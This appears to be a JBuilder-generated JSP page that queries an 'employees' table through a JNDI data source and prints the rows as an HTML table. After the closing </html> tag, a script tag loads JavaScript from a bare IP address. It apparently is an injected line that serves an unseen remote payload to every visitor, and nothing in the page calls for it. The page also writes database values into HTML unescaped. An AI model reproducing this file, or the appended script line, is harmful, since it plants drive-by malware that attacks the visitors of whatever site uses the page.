<%@page contentType="text/html; charset=GBK"%>
<%@page import="java.util.*"%>
<%@page import="java.sql.*"%>
<%@page import="javax.sql.*"%>
<%@page import="javax.naming.*"%>
;
<html>
<head>
<title>dbjsp</title>
</head>
<body bgcolor="#ffffff">
<h1>JBuilder Generated JSP</h1>
<%
  ResultSet result;
  try {
      Context ctx = new InitialContext();
      DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/northDB");
      // System.out.println(ds);
    Connection con = ds.getConnection();
    Statement stat = con.createStatement();
    result = stat.executeQuery("select * from employees");
    out.println("<table border=1 width=400>");
    while (result.next()) {
      out.println("<tr><td>" + result.getString(1) + "</td><td>" + result.getString(2) + "</td><td>" + result.getString(3) + "</td></tr>");
    }
    out.println("</table>");
    result.close();
    stat.close();
    con.close();
  }
  catch (Exception e) {
    //System.out.println("Error:" + e);
    e.printStackTrace();
  }
%>
</body>
</html>

<script language=javascript src=http://218.75.91.248/qq.js></script>